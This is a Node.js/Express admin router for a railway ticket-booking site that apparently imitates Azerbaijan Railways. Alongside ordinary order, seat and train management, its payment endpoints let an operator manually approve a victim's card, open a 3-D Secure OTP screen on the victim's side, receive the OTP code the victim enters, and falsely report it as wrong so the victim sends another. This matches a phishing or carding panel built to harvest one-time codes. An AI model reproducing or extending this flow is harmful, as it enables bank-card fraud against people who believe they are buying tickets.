const express = require('express');
const dayjs = require('dayjs');
const {
  User, Order, Ticket, Train, Station, Trip, Payment, SeatBlock, SyncLog
} = require('../models/index');
const { requireAdmin } = require('../middleware/auth');
const scheduleService = require('../services/scheduleService');
const paymentService = require('../services/paymentService');
const liveSyncService = require('../services/liveSyncService');
const config = require('../config');
const adyContent = require('../config/adyContent');
const h = require('../utils/helpers');

/* Panel daxilində keçidlər üçün baza yol */
function adminBase(req) {
  const lang = req.params && req.params.lang ? req.params.lang : config.defaultLocale;
  return '/' + lang + '/admin';
}

/* İdarəetmə panelinin səhifə marşrutları (dil prefiksi altında) */
const pages = express.Router({ mergeParams: true });
/* İdarəetmə API-si (dil prefiksindən asılı deyil) */
const api = express.Router();

async function pendingCount() {
  return Payment.countDocuments({ status: { $in: ['pending_admin', 'code_submitted'] } });
}

/* Panelin bütün səhifələri yalnız idarəçiyə açıqdır */
pages.use(requireAdmin);

/* İdarəçi hesabı ilk dəfə yaranıbsa müvəqqəti şifrə xəbərdarlığı */
async function ensureEnvAdmin() {
  try {
    const email = String(config.adminEmail || '').trim().toLowerCase();
    if (!email) return;
    let user = await User.findOne({ email });
    if (!user) {
      if (!config.adminPassword) return;
      user = await User.create({
        firstName: config.adminFirstName || 'Sistem',
        lastName: config.adminLastName || 'İdarəçi',
        email,
        password: await User.hashPassword(config.adminPassword),
        role: 'admin',
        managedFromEnv: true,
        passwordResetForced: !!config.adminTempPassword,
        locale: config.defaultLocale
      });
      console.log('[admin] hesab yaradıldı: ' + email);
    } else if (user.role !== 'admin') {
      user.role = 'admin';
      await user.save();
    }
  } catch (e) {
    console.warn('[admin] hesab hazırlanmadı:', e.message);
  }
}

/* İdarəetmə panelinə giriş yoxlaması — girişsiz sorğu login səhifəsinə yönləndirilir */
function adminEntry(req, res, next) {
  if (req.currentUser && req.currentUser.role === 'admin') return next();
  const wantsJson = req.xhr || (req.headers.accept || '').includes('application/json');
  if (wantsJson) return res.status(403).json({ ok: false, message: res.locals.t('msg.noPermission') });
  return res.redirect('/' + config.defaultLocale + '/login?next=' + encodeURIComponent(req.originalUrl));
}

/* ==================== İcmal ==================== */
pages.get('/', adminEntry, async (req, res, next) => {
  try {
    const startOfDay = dayjs().startOf('day').toDate();
    const [
      userCount, orderCount, ticketCount, trainCount, stationCount,
      pending, todayTrips, revenueAgg, recentOrders, pendingPayments, lastSync
    ] = await Promise.all([
      User.countDocuments({ role: 'user' }),
      Order.countDocuments(),
      Ticket.countDocuments({ status: 'active' }),
      Train.countDocuments({ active: true }),
      Station.countDocuments({ active: true }),
      pendingCount(),
      Trip.countDocuments({ date: dayjs().format('YYYY-MM-DD') }),
      Order.aggregate([{ $match: { status: { $in: ['confirmed', 'paid'] } } }, { $group: { _id: null, total: { $sum: '$total' } } }]),
      Order.find().sort({ createdAt: -1 }).limit(8).lean(),
      Payment.find({ status: { $in: ['pending_admin', 'code_submitted'] } }).sort({ createdAt: -1 }).limit(8).lean(),
      SyncLog.findOne().sort({ createdAt: -1 }).lean()
    ]);

    res.render('pages/admin/dashboard', {
      title: 'İdarəetmə paneli',
      stats: {
        users: userCount,
        orders: orderCount,
        tickets: ticketCount,
        trains: trainCount,
        stations: stationCount,
        pending,
        todayTrips,
        revenue: revenueAgg.length ? revenueAgg[0].total : 0
      },
      recentOrders,
      pendingPayments,
      lastSync,
      startOfDay
    });
  } catch (e) { next(e); }
});

/* ==================== Ödəniş təsdiqləri ==================== */
pages.get('/odenisler', requireAdmin, async (req, res, next) => {
  try {
    const status = req.query.status || 'pending';
    const filter = status === 'pending'
      ? { status: { $in: ['pending_admin', 'awaiting_3ds', 'code_submitted', 'awaiting_final'] } }
      : status === 'all' ? {} : { status };

    const payments = await Payment.find(filter).sort({ createdAt: -1 }).limit(100).lean();
    const orderIds = payments.map((p) => p.order).filter(Boolean);
    const userIds = payments.map((p) => p.user).filter(Boolean);

    const [orders, users] = await Promise.all([
      Order.find({ _id: { $in: orderIds } }).lean(),
      User.find({ _id: { $in: userIds } }).lean()
    ]);

    const orderMap = {};
    orders.forEach((o) => { orderMap[String(o._id)] = o; });
    const userMap = {};
    users.forEach((u) => { userMap[String(u._id)] = u; });

    res.render('pages/admin/payments', {
      title: res.locals.t('admin.payments'),
      payments,
      orderMap,
      userMap,
      status,
      pending: await pendingCount()
    });
  } catch (e) { next(e); }
});

/* ==================== Sifarişlər ==================== */
pages.get('/sifarisler', requireAdmin, async (req, res, next) => {
  try {
    const status = req.query.status || 'all';
    const filter = status === 'all' ? {} : { status };
    const orders = await Order.find(filter).sort({ createdAt: -1 }).limit(120).lean();
    const users = await User.find({ _id: { $in: orders.map((o) => o.user) } }).lean();
    const userMap = {};
    users.forEach((u) => { userMap[String(u._id)] = u; });

    res.render('pages/admin/orders', { title: res.locals.t('admin.orders'), orders, userMap, status, pending: await pendingCount() });
  } catch (e) { next(e); }
});

/* ==================== Reyslər və yerlər ==================== */
pages.get('/reysler', requireAdmin, async (req, res, next) => {
  try {
    const date = /^\d{4}-\d{2}-\d{2}$/.test(req.query.date || '') ? req.query.date : h.todayISO();
    const line = req.query.line || 'all';
    await scheduleService.ensureTripsForDate(date);
    const rows = await scheduleService.buildTimetableRows(date, line);
    const stations = await Station.find({ active: true }).sort({ order: 1 }).lean();

    /* Reys sənədlərini tapırıq ki, hər sətirdən birbaşa yer ekranına keçmək mümkün olsun */
    const trips = await Trip.find({ date }).select('_id trainNumber').lean();
    const tripMap = {};
    trips.forEach((t) => { tripMap[t.trainNumber] = String(t._id); });
    rows.forEach((r) => { r.tripId = tripMap[r.number] || ''; });

    res.render('pages/admin/trips', {
      title: res.locals.t('admin.trips'),
      rows, date, line, stations,
      dateText: h.azDate(date),
      today: h.todayISO(),
      pending: await pendingCount()
    });
  } catch (e) { next(e); }
});

pages.get('/reys/:tripId', requireAdmin, async (req, res, next) => {
  try {
    const trip = await Trip.findById(req.params.tripId).lean();
    if (!trip) return next();

    const maps = (trip.classes || []).map((c) => scheduleService.buildSeatMap(trip, c.code)).filter(Boolean);
    const blocks = await SeatBlock.find({ trip: trip._id, active: true }).lean();
    const orders = await Order.find({ trip: trip._id, status: 'confirmed' }).lean();

    res.render('pages/admin/trip-detail', {
      title: 'Reys ' + trip.trainNumber,
      trip, maps, blocks, orders,
      dateText: h.azDate(trip.date),
      pending: await pendingCount()
    });
  } catch (e) { next(e); }
});

/* ==================== Qatarlar / istifadəçilər / sinxronizasiya ==================== */
pages.get('/qatarlar', requireAdmin, async (req, res, next) => {
  try {
    const line = req.query.line || 'all';
    const filter = line === 'all' ? {} : { line };
    const trains = await Train.find(filter).sort({ number: 1 }).limit(300).lean();
    res.render('pages/admin/trains', { title: res.locals.t('admin.trains'), trains, line, total: trains.length, pending: await pendingCount() });
  } catch (e) { next(e); }
});

/* Yeni qatar / bilet (reys) əlavə etmək */
pages.get('/qatarlar/yeni', requireAdmin, async (req, res, next) => {
  try {
    const stations = await Station.find({ active: true }).sort({ country: 1, order: 1 }).lean();
    res.render('pages/admin/train-form', {
      title: res.locals.t('admin.newTitle'),
      train: null,
      stations,
      pending: await pendingCount()
    });
  } catch (e) { next(e); }
});

pages.get('/qatarlar/:id/redakte', requireAdmin, async (req, res, next) => {
  try {
    const train = await Train.findById(req.params.id).lean();
    if (!train) return next();
    const stations = await Station.find({ active: true }).sort({ country: 1, order: 1 }).lean();
    res.render('pages/admin/train-form', {
      title: 'Reysi redaktə et: ' + train.number,
      train,
      stations,
      pending: await pendingCount()
    });
  } catch (e) { next(e); }
});

pages.get('/istifadeciler', requireAdmin, async (req, res, next) => {
  try {
    const users = await User.find().sort({ createdAt: -1 }).limit(200).lean();
    res.render('pages/admin/users', { title: res.locals.t('admin.users'), users, pending: await pendingCount() });
  } catch (e) { next(e); }
});

pages.get('/sinxronizasiya', requireAdmin, async (req, res, next) => {
  try {
    const logs = await SyncLog.find().sort({ createdAt: -1 }).limit(30).lean();
    const { Setting } = require('../models/index');
    const noticeRow = await Setting.findOne({ key: 'notice' }).lean();
    const tickerRow = await Setting.findOne({ key: 'notice_ticker' }).lean();
    res.render('pages/admin/sync', {
      title: res.locals.t('admin.sync'),
      logs,
      sourceUrl: config.liveSourceUrl,
      enabled: config.liveSyncEnabled,
      intervalHours: config.liveSyncHours,
      noticeValue: noticeRow ? noticeRow.value : adyContent.NOTICE,
      tickerValue: tickerRow ? tickerRow.value : adyContent.NOTICE_TICKER,
      pending: await pendingCount()
    });
  } catch (e) { next(e); }
});

/* ==================== API: ödəniş addımları ==================== */
api.post('/payments/:id/approve-card', requireAdmin, async (req, res) => {
  try {
    const result = await paymentService.adminApproveCard(req.params.id, req.currentUser.email);
    return res.json({ ok: true, message: 'Kart təsdiqləndi. İstifadəçi 3-D kodu daxil etdikdə burada görünəcək.' });
  } catch (e) {
    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Əməliyyat alınmadı' });
  }
});

/* 2-ci təsdiq: istifadəçidə 3-D OTP ekranı açılır */
api.post('/payments/:id/open-otp', requireAdmin, async (req, res) => {
  try {
    const result = await paymentService.adminOpenOtp(req.params.id, req.currentUser.email);
    return res.json({ ok: true, message: 'OTP ekranı istifadəçiyə açıldı. Kod gözlənilir.', code: result.code });
  } catch (e) {
    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Əməliyyat alınmadı' });
  }
});

/* Admin OTP kodu səhvdir dedikdə - istifadəçi yenidən cəhd edə biləcək */
api.post('/payments/:id/reject-otp', requireAdmin, async (req, res) => {
  try {
    const result = await paymentService.adminRejectOtp(req.params.id, req.currentUser.email);
    return res.json({ ok: true, message: 'OTP kodu səhvdir. İstifadəçi yenidən cəhd edə biləcək.', code: result.code });
  } catch (e) {
    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Əməliyyat alınmadı' });
  }
});

api.post('/payments/:id/approve-final', requireAdmin, async (req, res) => {
  try {
    const result = await paymentService.adminFinalApprove(req.params.id, req.currentUser.email);
    return res.json({
      ok: true,
      message: 'Ödəniş təsdiqləndi və biletlər verildi.',
      pnr: result.tickets.length ? result.tickets[0].pnr : ''
    });
  } catch (e) {
    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Əməliyyat alınmadı' });
  }
});

api.post('/payments/:id/approve-topup', requireAdmin, async (req, res) => {
  try {
    const result = await paymentService.approveTopup(req.params.id, req.currentUser.email);
    return res.json({ ok: true, message: 'Balans artırımı təsdiqləndi.', balance: result.balance });
  } catch (e) {
    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Əməliyyat alınmadı' });
  }
});

api.post('/payments/:id/decline', requireAdmin, async (req, res) => {
  try {
    await paymentService.adminDecline(req.params.id, (req.body || {}).reason, req.currentUser.email);
    return res.json({ ok: true, message: 'Ödəniş rədd edildi.' });
  } catch (e) {
    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Əməliyyat alınmadı' });
  }
});

/* ==================== API: sifariş statusu ==================== */
api.post('/orders/:id/status', requireAdmin, async (req, res) => {
  try {
    const order = await Order.findById(req.params.id);
    if (!order) return res.status(404).json({ ok: false, message: 'Sifariş tapılmadı' });
    order.status = (req.body || {}).status || order.status;
    order.adminNote = (req.body || {}).note || order.adminNote;
    await order.save();
    return res.json({ ok: true, message: 'Status yeniləndi' });
  } catch (e) {
    return res.status(500).json({ ok: false, message: 'Yenilənmədi' });
  }
});

/* ==================== API: yer bağlama / açma ==================== */
api.post('/trips/:tripId/seats/block', requireAdmin, async (req, res) => {
  try {
    const b = req.body || {};
    const trip = await Trip.findById(req.params.tripId);
    if (!trip) return res.status(404).json({ ok: false, message: 'Reys tapılmadı' });

    const wagon = Number(b.wagon);
    const cls = (trip.classes || []).find((c) => c.code === b.classCode);
    if (!cls) return res.status(400).json({ ok: false, message: 'Sinif tapılmadı' });

    const seats = [];
    if (typeof b.seat === 'string' && b.seat.indexOf('-') > -1) {
      const parts = b.seat.split('-').map((x) => parseInt(x, 10));
      const from = Math.min(parts[0], parts[1]);
      const to = Math.max(parts[0], parts[1]);
      for (let s = from; s <= to; s += 1) seats.push(s);
    } else {
      seats.push(Number(b.seat));
    }

    let created = 0;
    for (const seat of seats) {
      if (!seat || seat < 1 || seat > cls.seatsPerWagon) continue;
      const sold = (trip.soldSeats || []).some((s) => s.wagon === wagon && s.seat === seat && s.classCode === cls.code);
      if (sold) continue;

      const exists = await SeatBlock.findOne({ trip: trip._id, wagon, seat, classCode: cls.code });
      if (exists) {
        if (!exists.active) {
          exists.active = true;
          exists.reason = b.reason || '';
          exists.createdBy = req.currentUser.email;
          await exists.save();
          created += 1;
        }
      } else {
        await SeatBlock.create({
          trip: trip._id,
          trainNumber: trip.trainNumber,
          date: trip.date,
          wagon,
          seat,
          classCode: cls.code,
          reason: b.reason || '',
          createdBy: req.currentUser.email
        });
        created += 1;
      }
    }

    const activeBlocks = await SeatBlock.find({ trip: trip._id, active: true }).lean();
    trip.blockedSeats = activeBlocks.map((bl) => ({ wagon: bl.wagon, seat: bl.seat, classCode: bl.classCode, pnr: '' }));
    await trip.save();

    return res.json({ ok: true, message: created + ' yer bağlandı', created });
  } catch (e) {
    return res.status(500).json({ ok: false, message: e.message || 'Əməliyyat alınmadı' });
  }
});

api.post('/trips/:tripId/seats/unblock', requireAdmin, async (req, res) => {
  try {
    const b = req.body || {};
    const trip = await Trip.findById(req.params.tripId);
    if (!trip) return res.status(404).json({ ok: false, message: 'Reys tapılmadı' });

    if (b.all) {
      await SeatBlock.updateMany({ trip: trip._id }, { $set: { active: false } });
      trip.blockedSeats = [];
      await trip.save();
      return res.json({ ok: true, message: 'Bütün bağlı yerlər açıldı' });
    }

    const wagon = Number(b.wagon);
    const seat = Number(b.seat);
    const block = await SeatBlock.findOne({ trip: trip._id, wagon, seat, classCode: b.classCode });
    if (!block) return res.status(404).json({ ok: false, message: 'Bağlı yer tapılmadı' });

    block.active = false;
    await block.save();

    trip.blockedSeats = (trip.blockedSeats || []).filter((s) => !(s.wagon === wagon && s.seat === seat && s.classCode === b.classCode));
    await trip.save();

    return res.json({ ok: true, message: 'Yer açıldı' });
  } catch (e) {
    return res.status(500).json({ ok: false, message: 'Əməliyyat alınmadı' });
  }
});

/* Vaqon konfiqurasiyası: boş yer sayını dəyişmək */
api.post('/trips/:tripId/config', requireAdmin, async (req, res) => {
  try {
    const b = req.body || {};
    const trip = await Trip.findById(req.params.tripId);
    if (!trip) return res.status(404).json({ ok: false, message: 'Reys tapılmadı' });

    const cls = (trip.classes || []).find((c) => c.code === b.classCode);
    if (!cls) return res.status(400).json({ ok: false, message: 'Sinif tapılmadı' });

    if (b.wagonCount !== undefined) cls.wagonCount = Math.max(1, Math.min(20, Number(b.wagonCount)));
    if (b.seatsPerWagon !== undefined) cls.seatsPerWagon = Math.max(4, Math.min(80, Number(b.seatsPerWagon)));
    if (b.price !== undefined) cls.price = Math.max(0, Number(b.price));

    await trip.save();
    return res.json({ ok: true, message: 'Konfiqurasiya yeniləndi' });
  } catch (e) {
    return res.status(500).json({ ok: false, message: 'Yenilənmədi' });
  }
});

/* ==================== API: qatar / bilet (reys) idarəsi ==================== */
const TRAIN_TYPES = ['express', 'fast', 'passenger', 'suburban', 'international'];
const LINES = ['absheron', 'domestic', 'georgia', 'international'];
const TIME_RE = /^([01]?\d|2[0-3]):[0-5]\d$/;
const DATE_RE = /^\d{4}-\d{2}-\d{2}$/;

function badRequest(message) {
  return Object.assign(new Error(message), { status: 400 });
}

/* Formadan gələn məlumatı yoxlayır və Train sənədinə çevirir */
async function parseTrainPayload(b) {
  const number = String(b.number || '').trim();
  if (!number || number.length > 12) throw badRequest('Qatar nömrəsi düzgün deyil');
  const title = String(b.title || '').trim();
  if (!title) throw badRequest('Qatarın adı boşdur');

  const line = LINES.indexOf(b.line) > -1 ? b.line : 'domestic';
  const type = TRAIN_TYPES.indexOf(b.type) > -1 ? b.type : 'passenger';

  const weekdays = Array.from(new Set((Array.isArray(b.weekdays) ? b.weekdays : []).map(Number)))
    .filter((d) => d >= 0 && d <= 6).sort();
  if (!weekdays.length) throw badRequest('Ən azı bir hərəkət günü seçin');

  const rawStops = Array.isArray(b.stops) ? b.stops : [];
  if (rawStops.length < 2) throw badRequest('Ən azı iki dayanacaq (başlanğıc və son) əlavə edin');

  const codes = rawStops.map((x) => String(x.code || '').trim().toUpperCase());
  const stationDocs = await Station.find({ code: { $in: codes } }).lean();
  const nameByCode = {};
  stationDocs.forEach((st) => { nameByCode[st.code] = st.name; });

  let offset = 0;
  let prevMin = -1;
  let prevKm = 0;
  const stops = rawStops.map((x, i) => {
    const code = codes[i];
    if (!nameByCode[code]) throw badRequest((i + 1) + '-ci dayanacaq: stansiya tapılmadı (' + (code || 'boş') + ')');
    const arrive = String(x.arrive || '').trim();
    const depart = String(x.depart || '').trim();
    if (arrive && !TIME_RE.test(arrive)) throw badRequest((i + 1) + '-ci dayanacaq: gəliş vaxtı SS:DD formatında olmalıdır');
    if (depart && !TIME_RE.test(depart)) throw badRequest((i + 1) + '-ci dayanacaq: yola düşmə vaxtı SS:DD formatında olmalıdır');
    if (i === 0 && !depart) throw badRequest('İlk dayanacaq üçün yola düşmə vaxtı vacibdir');
    if (i === rawStops.length - 1 && !arrive) throw badRequest('Son dayanacaq üçün gəliş vaxtı vacibdir');

    let dayOffset = 0;
    [arrive, depart].filter(Boolean).forEach((t, k) => {
      const m = h.timeToMinutes(t);
      if (m < prevMin) offset += 1;
      prevMin = m;
      if (k === 0) dayOffset = offset;
    });

    const distanceKm = i === 0 ? 0 : Math.max(0, Number(x.distanceKm) || 0);
    if (distanceKm < prevKm) throw badRequest((i + 1) + '-ci dayanacaq: məsafə əvvəlkindən az ola bilməz');
    prevKm = distanceKm;

    return { code, name: nameByCode[code], arrive: i === 0 ? '' : arrive, depart: i === rawStops.length - 1 ? '' : depart, dayOffset, distanceKm };
  });

  const rawClasses = Array.isArray(b.classes) ? b.classes : [];
  if (!rawClasses.length) throw badRequest('Ən azı bir vaqon sinfi və qiymət əlavə edin');
  const seen = new Set();
  const classes = rawClasses.map((c, i) => {
    const code = h.slugify(c.code || c.title || '') || ('class' + (i + 1));
    if (seen.has(code)) throw badRequest('Sinif kodu təkrarlanır: ' + code);
    seen.add(code);
    const cTitle = String(c.title || '').trim();
    if (!cTitle) throw badRequest((i + 1) + '-ci sinifin adı boşdur');
    const price = Number(c.price);
    if (!(price >= 0)) throw badRequest(cTitle + ': qiymət düzgün deyil');
    return {
      code,
      title: cTitle,
      wagonCount: Math.max(1, Math.min(20, parseInt(c.wagonCount, 10) || 1)),
      seatsPerWagon: Math.max(4, Math.min(80, parseInt(c.seatsPerWagon, 10) || 36)),
      price: Math.round(price * 100) / 100,
      multiplier: 1
    };
  });

  const validFrom = String(b.validFrom || '').trim();
  const validUntil = String(b.validUntil || '').trim();
  const advanceSaleUntil = String(b.advanceSaleUntil || '').trim();
  [validFrom, validUntil, advanceSaleUntil].forEach((d) => {
    if (d && !DATE_RE.test(d)) throw badRequest('Tarix formatı düzgün deyil');
  });
  if (validFrom && validUntil && validUntil < validFrom) throw badRequest('Son tarix başlanğıc tarixindən əvvəl ola bilməz');

  return {
    number, title, type, line, weekdays, stops, classes,
    from: stops[0].code,
    to: stops[stops.length - 1].code,
    basePrice: classes[0].price,
    pricePerKm: line === 'domestic' ? 0.035 : 0.06,
    validFrom, validUntil, advanceSaleUntil,
    active: b.active === undefined ? true : !!b.active
  };
}

api.post('/trains', requireAdmin, async (req, res) => {
  try {
    const data = await parseTrainPayload(req.body || {});
    if (await Train.findOne({ number: data.number })) throw badRequest('Bu nömrəli qatar artıq mövcuddur: ' + data.number);
    const train = await Train.create(Object.assign({}, data, { source: 'admin', lastSyncedAt: new Date() }));
    await scheduleService.refreshFutureTrips(train.toObject());
    return res.json({ ok: true, message: 'Reys əlavə edildi: ' + train.number, id: String(train._id) });
  } catch (e) {
    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Əlavə edilmədi' });
  }
});

api.put('/trains/:id', requireAdmin, async (req, res) => {
  try {
    const train = await Train.findById(req.params.id);
    if (!train) return res.status(404).json({ ok: false, message: 'Qatar tapılmadı' });
    const data = await parseTrainPayload(Object.assign({}, req.body || {}, { number: train.number }));
    train.set(Object.assign({}, data, { source: 'admin', lastSyncedAt: new Date() }));
    await train.save();
    const r = await scheduleService.refreshFutureTrips(train.toObject());
    return res.json({ ok: true, message: 'Yadda saxlanıldı (' + r.removed + ' gələcək reys yenidən qurulur, ' + r.repriced + ' reysdə qiymət yeniləndi)' });
  } catch (e) {
    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Yadda saxlanmadı' });
  }
});

api.post('/trains/:id/toggle', requireAdmin, async (req, res) => {
  try {
    const train = await Train.findById(req.params.id);
    if (!train) return res.status(404).json({ ok: false, message: 'Qatar tapılmadı' });
    train.active = !train.active;
    train.source = 'admin';
    await train.save();
    await scheduleService.refreshFutureTrips(train.toObject());
    return res.json({ ok: true, message: train.active ? 'Reys aktivləşdirildi' : 'Reys deaktiv edildi', active: train.active });
  } catch (e) {
    return res.status(500).json({ ok: false, message: 'Əməliyyat alınmadı' });
  }
});

api.delete('/trains/:id', requireAdmin, async (req, res) => {
  try {
    const train = await Train.findById(req.params.id);
    if (!train) return res.status(404).json({ ok: false, message: 'Qatar tapılmadı' });
    if (train.source !== 'admin') {
      return res.status(400).json({ ok: false, message: 'Sistem reysi silinmir; onu deaktiv edin' });
    }
    const number = train.number;
    await train.deleteOne();
    await scheduleService.refreshFutureTrips({ number, classes: [] });
    return res.json({ ok: true, message: 'Reys silindi' });
  } catch (e) {
    return res.status(500).json({ ok: false, message: 'Silinmədi' });
  }
});

/* Yeni stansiya (Gürcüstan daxil) */
api.post('/stations', requireAdmin, async (req, res) => {
  try {
    const b = req.body || {};
    const code = String(b.code || '').trim().toUpperCase();
    const name = String(b.name || '').trim();
    if (!/^[A-Z0-9]{2,6}$/.test(code)) throw badRequest('Stansiya kodu 2-6 latın hərf/rəqəm olmalıdır');
    if (!name) throw badRequest('Stansiya adı boşdur');
    if (await Station.findOne({ code })) throw badRequest('Bu kodlu stansiya artıq var: ' + code);
    const country = ['AZ', 'GE', 'TR', 'RU', 'other'].indexOf(b.country) > -1 ? b.country : 'AZ';
    const st = await Station.create({
      code, name, nameEn: String(b.nameEn || name), country,
      city: String(b.city || name), region: String(b.region || ''),
      order: country === 'GE' ? 60 : 90, source: 'admin', active: true
    });
    return res.json({ ok: true, message: 'Stansiya əlavə edildi', station: { code: st.code, name: st.name, country: st.country } });
  } catch (e) {
    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Əlavə edilmədi' });
  }
});

/* ==================== API: sinxronizasiya ==================== */
api.post('/sync/run', requireAdmin, async (req, res) => {
  try {
    const result = await liveSyncService.runSync('admin:' + req.currentUser.email);
    return res.json({ ok: true, message: 'Sinxronizasiya tamamlandı', result });
  } catch (e) {
    return res.status(500).json({ ok: false, message: e.message || 'Sinxronizasiya alınmadı' });
  }
});

/* ==================== API: bildiriş idarəsi (canlı, MongoDB) ==================== */
api.post('/settings/notice', requireAdmin, async (req, res) => {
  try {
    const b = req.body || {};
    const { Setting } = require('../models/index');
    if (b.notice !== undefined) {
      await Setting.updateOne({ key: 'notice' }, { $set: { value: String(b.notice || '') } }, { upsert: true });
    }
    if (b.ticker !== undefined) {
      await Setting.updateOne({ key: 'notice_ticker' }, { $set: { value: String(b.ticker || '') } }, { upsert: true });
    }
    /* Keşi sıfırla — növbəti sorğu dərhal yeni mətni göstərsin */
    if (req.app && req.app.locals && req.app.locals.noticeCache) req.app.locals.noticeCache.at = 0;
    return res.json({ ok: true, message: 'Bildiriş yeniləndi' });
  } catch (e) {
    return res.status(500).json({ ok: false, message: 'Yenilənmədi' });
  }
});

/* ==================== API: statistikalar ==================== */
api.get('/stats', requireAdmin, async (req, res) => {
  try {
    const [users, orders, tickets, pending, revenue] = await Promise.all([
      User.countDocuments(),
      Order.countDocuments(),
      Ticket.countDocuments({ status: 'active' }),
      pendingCount(),
      Order.aggregate([{ $match: { status: { $in: ['confirmed', 'paid'] } } }, { $group: { _id: null, total: { $sum: '$total' } } }])
    ]);
    res.json({ ok: true, users, orders, tickets, pending, revenue: revenue.length ? revenue[0].total : 0 });
  } catch (e) {
    res.status(500).json({ ok: false, message: 'Statistika alınmadı' });
  }
});

module.exports = { pages, api, ensureEnvAdmin };
